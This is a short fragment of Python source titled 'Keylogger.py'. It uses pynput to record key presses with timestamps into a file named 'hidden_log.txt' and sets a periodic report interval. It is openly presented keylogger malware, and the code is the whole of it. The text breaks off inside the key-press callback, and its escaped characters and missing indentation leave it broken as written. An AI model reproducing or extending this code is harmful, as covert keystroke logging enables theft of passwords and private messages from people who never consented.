# Keylogger.py

import pynput.keyboard
import threading
import time
import os

# Configuration Variables

LOG\_FILE = "hidden\_log.txt"  \# Name of the log file
REPORT\_INTERVAL = 30         \# Time in seconds between report cycles
LOGGING\_STARTED = False

def log\_to\_file(data):
"""Appends data to the log file."""
with open(LOG\_FILE, "a") as f:
f.write(data)

def on\_key\_press(key):
"""Callback function executed on key press."""
global LOGGING\_STARTED
if not LOGGING\_STARTED:
\# Start a new logging session with timestamp
log\_to\_file(f"\\n\\n[{time.ctime()} - LOGGING SESSION START]\\n")
LOGGING\_STARTED = True
